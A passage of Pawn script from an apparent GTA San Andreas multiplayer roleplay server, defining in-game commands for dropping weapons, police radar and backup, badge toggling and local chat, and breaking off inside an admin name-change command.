			format(string, sizeof(string), "* %s has dropped their silenced pistol.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 23);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "camera", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][9] == 43)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your camera.");
			format(string, sizeof(string), "* %s has dropped their camera.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 43);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "nitestick", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your nitestick.");
			format(string, sizeof(string), "* %s has dropped their nitestick.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 3);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "mace", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][9] == 41)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your mace.");
			format(string, sizeof(string), "* %s has dropped their mace.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 41);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "knife", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 4)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your knife.");
			format(string, sizeof(string), "* %s has dropped their knife.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 4);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "9mm", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 22)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your 9mm pistol.");
			format(string, sizeof(string), "* %s has dropped their 9mm pistol.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 22);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "shotgun", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 25)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your shotgun.");
			format(string, sizeof(string), "* %s has dropped their shotgun.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 25);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "mp5", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 29)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your MP5.");
			format(string, sizeof(string), "* %s has dropped their MP5.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 29);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "uzi", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 28)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your Micro SMG.");
			format(string, sizeof(string), "* %s has dropped their Micro SMG.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 28);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "uzi", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 32)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your Tec-9.");
			format(string, sizeof(string), "* %s has dropped their Tec-9.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 32);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "deagle", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 24)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your Desert Eagle.");
			format(string, sizeof(string), "* %s has dropped their Desert Eagle.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 24);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "rifle", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 33)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your rifle.");
			format(string, sizeof(string), "* %s has dropped their rifle.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 33);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "ak47", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 30)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your AK-47.");
			format(string, sizeof(string), "* %s has dropped their AK-47.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 30);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "m4", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 31)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your M4.");
			format(string, sizeof(string), "* %s has dropped their M4.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 31);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "spas12", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 27)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your SPAS-12.");
			format(string, sizeof(string), "* %s has dropped their SPAS-12.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 27);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "sniper", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 34)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your sniper rifle.");
			format(string, sizeof(string), "* %s has dropped their sniper rifle.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 34);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "flowers", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 14)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your flowers.");
			format(string, sizeof(string), "* %s has dropped their flowers.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 14);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "knuckles", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][0] == 1)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your brass knuckles.");
			format(string, sizeof(string), "* %s has dropped their brass knuckles.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 1);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "baseballbat", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 5)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your baseball bat.");
			format(string, sizeof(string), "* %s has dropped their baseball bat.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 5);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "cane", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your cane.");
			format(string, sizeof(string), "* %s has dropped their cane.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			PlayerInfo[playerid][pGuns][10] = 0;
			RemovePlayerWeapon(playerid, 15);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "shovel", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your shovel.");
			format(string, sizeof(string), "* %s has dropped their shovel.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 6);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "golfclub", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 2)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your golf club.");
			format(string, sizeof(string), "* %s has dropped their golf club.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 2);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "katana") == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 8)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your katana.");
			format(string, sizeof(string), "* %s has dropped their katana.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 8);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "dildo", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][10] == 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your dildo.");
			format(string, sizeof(string), "* %s has dropped their dildo.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 10);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "parachute", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][11] == 46)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your parachute.");
			format(string, sizeof(string), "* %s has dropped their parachute.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 46);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "smoke", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][8] == 17)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your smoke grenade.");
			format(string, sizeof(string), "* %s has dropped their smoke grenade.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 17);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "chainsaw", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 9)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your chainsaw.");
			format(string, sizeof(string), "* %s has dropped their chainsaw.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 9);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "fire", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][9] == 42)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your fire extinguisher.");
			format(string, sizeof(string), "* %s has dropped their fire extinguisher.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 42);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "minigun", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][7] == 38)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your minigun.");
			format(string, sizeof(string), "* %s has dropped their minigun.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 38);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else if(strcmp(params, "poolcue", true) == 0)
	{
		if(PlayerInfo[playerid][pGuns][1] == 7)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have dropped your pool cue.");
			format(string, sizeof(string), "* %s has dropped their pool cue.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			RemovePlayerWeapon(playerid, 7);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "You do not have that weapon!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You have entered an invalid weapon name.");
	}
	return 1;
}

CMD:radar(playerid, params[])
{
    if(IsMDCPermitted(playerid)) {
		if(!IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_GRAD2, "You need to be in a vehicle in order to use the onboard MDC speed radar.");

		if(RadarActive[playerid] == 0) {
			RadarTitle[playerid] = TextDrawCreate(530.000000, 126.000000, "MDC - Speed Radar");
			TextDrawBackgroundColor(RadarTitle[playerid], 255);
			TextDrawFont(RadarTitle[playerid], 1);
			TextDrawLetterSize(RadarTitle[playerid], 0.240000, 1.000000);
			TextDrawColor(RadarTitle[playerid], -1);
			TextDrawSetOutline(RadarTitle[playerid], 0);
			TextDrawSetProportional(RadarTitle[playerid], 1);
			TextDrawSetShadow(RadarTitle[playerid], 1);
			TextDrawUseBox(RadarTitle[playerid], 1);
			TextDrawBoxColor(RadarTitle[playerid], 255);
			TextDrawTextSize(RadarTitle[playerid], 606.000000, 1.000000);

			RadarContext[playerid] = TextDrawCreate(530.000000, 138.000000, "Seeking speed...");
			TextDrawBackgroundColor(RadarContext[playerid], 255);
			TextDrawFont(RadarContext[playerid], 1);
			TextDrawLetterSize(RadarContext[playerid], 0.200000, 0.899999);
			TextDrawColor(RadarContext[playerid], -1);
			TextDrawSetOutline(RadarContext[playerid], 0);
			TextDrawSetProportional(RadarContext[playerid], 1);
			TextDrawSetShadow(RadarContext[playerid], 1);
			TextDrawUseBox(RadarContext[playerid], 1);
			TextDrawBoxColor(RadarContext[playerid], 170);
			TextDrawTextSize(RadarContext[playerid], 606.000000, 1.000000);
			TextDrawShowForPlayer(playerid, RadarTitle[playerid]);
			TextDrawShowForPlayer(playerid, RadarContext[playerid]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now logged on the MDC Speed Radar.");
			RadarActive[playerid] = 1;
		} else {
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now logged off the MDC Speed Radar.");
			RadarActive[playerid] = 0;
			TextDrawDestroy(RadarTitle[playerid]);
			TextDrawDestroy(RadarContext[playerid]);
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "   You're not a Cop / FBI!");
	return 1;
}

CMD:backup(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5) {
		if(Backup[playerid] != 1) {
			new
				zone[MAX_ZONE_NAME],
				string[40 + MAX_PLAYER_NAME];

			GetPlayer3DZone(playerid, zone, sizeof(zone));
			format(string, sizeof(string), "* %s requests backup over their radio.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			format(string, sizeof(string), "%s is requesting immediate backup at %s.", GetPlayerNameEx(playerid), zone);
            Backup[playerid] = 1;
			foreach(Player, i) {
				if(IsACop(i)) {
      				SetPlayerMarkerForPlayer(i, playerid, 0x2641FEAA);
					SendClientMessage(i, TEAM_BLUE_COLOR, string);
				}
			}
			SendClientMessage(playerid, COLOR_WHITE, "Type /nobackup to clear your backup request.");
			SetTimerEx("BackupClear", 180000, false, "ii", playerid, 1);
		} else return SendClientMessage(playerid, COLOR_GREY, "  You already have an active backup request!");
	} else return SendClientMessage(playerid, COLOR_GRAD2, "   You're not a Cop / FBI / Coastguard!");
	return 1;
}

CMD:nobackup(playerid, params[])
{
    BackupClear(playerid, 0);
	return 1;
}

CMD:badge(playerid, params[]) {
    if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9)
	{
		if(GetPVarInt(playerid, "EventToken") == 1)
		{
			SendClientMessage(playerid, COLOR_WHITE, "You can't use this command while in an event.");
			return 1;
	    }
		if(PlayerInfo[playerid][pDuty])
		{
			PlayerInfo[playerid][pDuty] = 0;
			SetPlayerToTeamColor(playerid);
			SendClientMessage(playerid, COLOR_WHITE, "You have hidden your badge, and will now be identified as being off-duty.");
		}
		else
		{
			PlayerInfo[playerid][pDuty] = 1;
			SetPlayerToTeamColor(playerid);
			SendClientMessage(playerid, COLOR_WHITE, "You have shown your badge, and will now be identified as being on-duty.");
		}
	}
	return 1;
}

CMD:me(playerid, params[])
{
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /me [action]");

	new string[128];
	format(string, sizeof(string), "* %s %s", GetPlayerNameEx(playerid), params);
	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return 1;
}

CMD:do(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");
		return 1;
	}
	if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /do [action]");
	else if(strlen(params) >= 100) return SendClientMessage(playerid, COLOR_GREY, "The specified message must not be longer than 99 characters in length.");
	new string[128];
	format(string, sizeof(string), "* %s (( %s ))", params, GetPlayerNameEx(playerid));
	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	return 1;
}

CMD:shout(playerid, params[]) {
	return cmd_s(playerid, params);
}

CMD:s(playerid, params[]) {
	if(gPlayerLogged[playerid] == 0)
		return SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/s)hout [shout chat]");

	new string[128];
	format(string, sizeof(string), "(shouts) %s!", params);
	SetPlayerChatBubble(playerid,string,COLOR_WHITE,60.0,5000);
	format(string, sizeof(string), "%s shouts: %s!", GetPlayerNameEx(playerid), params);
	ProxDetector(30.0, playerid, string,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_FADE1,COLOR_FADE2);

	if(PlayerInfo[playerid][pBugged] == 1) {
		format(string, sizeof(string), "(bug) %s shouts: %s!", GetPlayerNameEx(playerid), params);
		SendBugMessage(2, COLOR_LIGHTGREEN, string);
	}
	return 1;
}

CMD:low(playerid, params[]) {
	return cmd_l(playerid, params);
}

CMD:l(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");
		return 1;
	}

	if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/l)ow [close chat]");

	new string[128];
	format(string, sizeof(string), "%s says quietly: %s", GetPlayerNameEx(playerid), params);
	ProxDetector(5.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
	format(string, sizeof(string), "(quietly) %s", params);
	SetPlayerChatBubble(playerid,string,COLOR_WHITE,5.0,5000);
	if(PlayerInfo[playerid][pBugged] == 1)
	{
		format(string, sizeof(string), "(bug) %s says quietly: %s", GetPlayerNameEx(playerid), params);
		SendBugMessage(2, COLOR_LIGHTGREEN, string);
	}
	return 1;
}

CMD:b(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");
		return 1;
	}
	if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /b [local ooc chat]");
	new string[128];
	format(string, sizeof(string), "%s says: (( %s ))", GetPlayerNameEx(playerid), params);
	ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
	return 1;
}

CMD:w(playerid, params[])
{
	new giveplayerid, whisper[128];

	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not logged in.");
		return 1;
	}
	if(sscanf(params, "us[128]", giveplayerid, whisper))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/w)hisper [playerid/partofname] [text]");
		return 1;
	}
	if(IsPlayerConnected(giveplayerid))
	{
		if(HidePM[giveplayerid] > 0 && AdminDuty[playerid] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "That player is blocking whispers!");
			return 1;
		}
		new giveplayer[MAX_PLAYER_NAME], sendername[MAX_PLAYER_NAME], string[128];
		sendername = GetPlayerNameEx(playerid);
		giveplayer = GetPlayerNameEx(giveplayerid);
		if(giveplayerid == playerid)
		{
			if(PlayerInfo[playerid][pSex] == 1) format(string, sizeof(string), "* %s mutters something to himself.", GetPlayerNameEx(playerid));
			else format(string, sizeof(string), "* %s mutters something to herself.", GetPlayerNameEx(playerid));
			return ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		if(ProxDetectorS(5.0, playerid, giveplayerid) || AdminDuty[playerid] == 1)
		{
			format(string, sizeof(string), "%s (ID %d) whispers to you: %s", GetPlayerNameEx(playerid), playerid, whisper);

			if(strlen(string) > 92)
			{
				new firstline[128], secondline[128];
				strmid(firstline, string, 0, 88);
				strmid(secondline, string, 88, 128);
				format(firstline, sizeof(firstline), "%s ...", firstline);
				SendClientMessage(giveplayerid, COLOR_YELLOW, firstline);
				SendClientMessage(giveplayerid, COLOR_YELLOW, secondline);
			}
			else SendClientMessage(giveplayerid,COLOR_YELLOW, string);

			format(string, sizeof(string), "You whispered to %s: %s", GetPlayerNameEx(giveplayerid),whisper);
			if(strlen(string) > 92)
			{
				new firstline[128], secondline[128];
				strmid(firstline, string, 0, 88);
				strmid(secondline, string, 88, 128);
				format(firstline, sizeof(firstline), "%s ...", firstline);
				SendClientMessage(playerid, COLOR_YELLOW, firstline);
				SendClientMessage(playerid, COLOR_YELLOW, secondline);
			}
			else SendClientMessage(playerid,COLOR_YELLOW, string);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
		}
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	return 1;
}

CMD:togwhisper(playerid, params[])
{
	if(!HidePM[playerid])
	{
		HidePM[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "You have disabled whisper chat.");
	}
	else
	{
		HidePM[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "You have enabled whisper chat.");
	}
	return 1;
}

CMD:getparachute(playerid, params[]) {
	if(IsPlayerInRangeOfPoint(playerid, 2.0, 1544.2, -1353.4, 329.4)) { // Startower parachute
	    if(PlayerInfo[playerid][pGuns][11] == 46)
	        RemovePlayerWeapon(playerid, 46);

 		if(PlayerInfo[playerid][pGuns][11] != 46) {
    		GivePlayerValidWeapon(playerid, 46, 99999);
		}
		else SendClientMessage(playerid, COLOR_GREY,"You already have a parachute.");
	}
	else SendClientMessage(playerid, COLOR_GREY,"You're not close enough to the parachute on Startower.");
	return 1;
}

CMD:changename(playerid, params[])
{
	if(IsAtNameChange(playerid))
	{
		if(AdminDuty[playerid] == 1)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You can't access this while on-duty as admin.");
			return 1;
	    }
		if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 4)
		{
			ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE, DIALOG_STYLE_INPUT, "Name Change","Please enter your new desired name!\n\nNote: Name Changes are free for hitmen and FBI.", "Change", "Cancel");
		}
		else
		{
			ShowPlayerDialogEx(playerid, DIALOG_NAMECHANGE, DIALOG_STYLE_INPUT, "Name Change","Please enter your new desired name!\n\nNote: Name Changes cost $1500 per level.", "Change", "Cancel");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "   You're not in the Name Change Place!");
	}
	return 1;
}

CMD:nrn(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2) {
		new string[128], giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /nrn [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] >= 1 || PlayerInfo[giveplayerid][pHelper] >= 1 || PlayerInfo[giveplayerid][pLevel] >= 2 && PlayerInfo[playerid][pAdmin] < 1)
				return SendClientMessage(playerid, COLOR_GRAD2, "You can't use that command on admins, helpers or players higher than level 1 (if you're a helper).");

			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has offered %s a free name change because their name is non-RP.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
			ABroadCast(COLOR_YELLOW, string, 1);
